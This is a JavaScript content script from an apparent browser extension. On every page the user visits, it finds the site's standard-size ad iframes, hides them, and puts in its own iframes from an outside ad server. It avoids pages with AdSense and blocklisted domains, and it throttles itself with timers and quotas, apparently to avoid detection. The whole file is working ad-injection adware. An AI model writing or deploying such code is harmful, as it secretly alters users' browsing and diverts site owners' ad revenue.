if (!pluginnetwork) var pluginnetwork = {};
var failcount = 0;

pluginnetwork.pluginStorage = function () {
  return {
    initialized : false,
		getItem : false,
		setItem : false,
		removeItem : false,
		setupStorage : function (response)
		{
		  pluginnetwork.pluginStorage = response;
      pluginnetwork.pluginStorage.getItem = function(key){
        if (typeof(pluginnetwork.pluginStorage[key]) != 'undefined') return pluginnetwork.pluginStorage[key];
        return null;
      }
      pluginnetwork.pluginStorage.setItem = function(key, value) {
              pluginnetwork.pluginStorage[key] = value;
              var thisJSON =  {
                  requestType: 'localStorage',
                  operation: 'setItem',
                  itemName: key,
                  itemValue: value
              }
              chrome.extension.sendRequest(thisJSON, function(response) {
                  // this is an asynchronous response, we don't really need to do anything here...
              });
      }
      pluginnetwork.pluginStorage.removeItem =  function(key) {
        delete pluginnetwork.pluginStorage[key];
        var thisJSON =  {
          requestType: 'localStorage',
          operation: 'removeItem',
          itemName: key
        }
        chrome.extension.sendRequest(thisJSON, function(response) {
        // this is an asynchronous response, we don't really need to do anything here...
        });
      }
      pluginnetwork.pluginStorage.initialized = true;
    },
		init:function()
		{
      var thisJSON = {
        requestType: 'getLocalStorage'
      }
      chrome.extension.sendRequest(thisJSON, function(response) {
          pluginnetwork.pluginStorage.setupStorage(response);
          //console.log('setup storage');
      });	  
		}
  }
}();
pluginnetwork.pluginStorage.init();

pluginnetwork.contentscript = function () {
  return {
    onDomInsertedTimer: false,
    documentParsed: false,
    initialized:false,
    isMarketingEnabled: function () {
      if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.marketing') == "false") {
        return false;
      } else {
        return true;
      }
    },
    isFirstRunDaily: function () {
      var lastRun = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.lastrun');
      var bIsFirstRun = false;
      if (typeof(lastRun) == "undefined") {
        lastRun = 0;
      }
      var currentdate = new Date();
      var currentdatefixed = currentdate.getFullYear() + "" + pluginnetwork.helpers.getMonthFormatted(currentdate) + "" + pluginnetwork.helpers.getDayFormatted(currentdate);
      if (parseInt(currentdatefixed) > parseInt(lastRun)) {
        bIsFirstRun = true;
      }
      return bIsFirstRun;
    },
    createIframe: function (id, zone, height, width) {
      var runstr = "";
      if (this.isFirstRunDaily()) {
        runstr = "&firstrun="+pluginnetwork.GLOBALS.PLUGIN_NAMESPACE;
      }
      var ifr = document.createElement("iframe");
      ifr.setAttribute("src", "http://www.iicdn.com/www/delivery/afr.php?zoneid=" + zone + "&refresh=60" + runstr);
      ifr.setAttribute("height", height);
      ifr.setAttribute("width", width);
      ifr.setAttribute("name", id);
      ifr.setAttribute("id", id);
      ifr.setAttribute("scrolling", "NO");
      ifr.setAttribute("frameborder", "0");
      return ifr;
    },
    contentEdit: function() {
      var swapDefObj={"www.example.com":[{selector:".example_class",append:false,style:"",ielement:1},{selector:"#example_id",append:false,style:"",ielement:1}]};
      for (i in document.getElementsByTagName("script")) {
        if (typeof(document.getElementsByTagName("script")[i].src)!=="undefined"){
          if (document.getElementsByTagName("script")[i].src.indexOf("pagead/show_ads.js")!==-1) // avoid adsense.... all bow before the big G
          {
            return; // exit early
          }          
        }
      }
      if (this.isMarketingEnabled()) {
        if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions')!==null) {
          if(pluginnetwork.helpers.IsJsonString(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions'))) {
            swapDefObj = JSON.parse(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions'));
          }
        }
        if (document.querySelector('#a47abb2d')!==null) return;
        if (document.querySelector('#a47abb3d')!==null) return;
        if (document.querySelector('#a47abb4d')!==null) return;
        if (typeof(swapDefObj["bl"])=="undefined") return;
        if (typeof(swapDefObj["global"])=="undefined") return;
        if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq')==null) return;
        //
        //
        //
        
        var domainparts = window.location.host.split(".").reverse();
        for(var i = 0; i < swapDefObj["bl"].length; i++) {
          if(swapDefObj["bl"][i].indexOf(domainparts[1])!=-1) {
            return;// exit early
          }
        }
        
        //
        // 

        var td = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb');
        if (td==null)
        {
          if ((new Date().getMinutes()%2 == 0)==false){
             return;
          }            
        }
        var ei = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ei');
        if (ei==null)
        {
          return;
        }
                 
        var ft = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft');
        if (ft==null)
        {
          ft = Math.round(new Date().getTime()/1000);
        } else {
          ft = parseInt(ft);
        }

        if (Math.round(new Date().getTime()/1000)<ft) {
          return;
        }
        var aq = parseInt(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq'));
        var tta = false;
        var AZ_728 = 0;
        var AZ_300 = 0;
        var AZ_160 = 0;
        if(aq>0) {
          if (document.querySelector('iframe[width="300"]')!==null) {
            var a1 = document.querySelector('iframe[width="300"]');
            if (a1.height == 250)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq";
              AZ_300 = pluginnetwork.GLOBALS.AZ_300;
              r.appendChild(this.createIframe('a47abb2d', AZ_300, 250, 300));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }
          if (document.querySelector('iframe[width="728"]')!==null) {
            var a1 = document.querySelector('iframe[width="728"]');
            if (a1.height == 90)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq2";
              AZ_728 = pluginnetwork.GLOBALS.AZ_728;
              r.appendChild(this.createIframe('a47abb3d', AZ_728, 90, 728));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }              
          if (document.querySelector('iframe[width="160"]')!==null) {
            var a1 = document.querySelector('iframe[width="160"]');
            if (a1.height == 600)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq3";
              AZ_160 = pluginnetwork.GLOBALS.AZ_160;
              r.appendChild(this.createIframe('a47abb4d', AZ_160, 600, 160));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }
          if (tta == true)
          {
            ft = (Math.round(new Date().getTime()/1000)+Math.floor((Math.random() * 180) + 300));
            if (aq<0) aq = 0; // prevent the accidental -1
            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', aq);
            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft', ft);              
          }
        }
      }
    },
    contentUpdate: function() {
      if (!pluginnetwork.contentscript.documentParsed) return;
      if (pluginnetwork.contentscript.onDomInsertedTimer) {
        clearTimeout(pluginnetwork.contentscript.onDomInsertedTimer);
      }
      pluginnetwork.contentscript.onDomInsertedTimer = setTimeout(function () {
        pluginnetwork.contentscript.contentEdit();
        onDomInsertedTimer = null;
      }, 300);
    },
    init: function() {
      if (pluginnetwork.contentscript.initialized) return; // we're init'd return    
      if (pluginnetwork.pluginStorage.initialized) {
        pluginnetwork.contentscript.initialized = true;
        if (window === window.top)
        {
          pluginnetwork.contentscript.documentParsed = true;
          pluginnetwork.contentscript.contentEdit();
        }
      } else {
        failcount = failcount+1;
        if (failcount < 20){
          setTimeout(pluginnetwork.contentscript.init,100);
        }
      }		
    }
  }
}();
pluginnetwork.contentscript.init();
//
// Porting to mutation obervers once support is available on more than chrome
document.addEventListener("DOMContentLoaded", pluginnetwork.contentscript.init, false);
document.addEventListener("DOMNodeInserted", pluginnetwork.contentscript.contentUpdate, false);
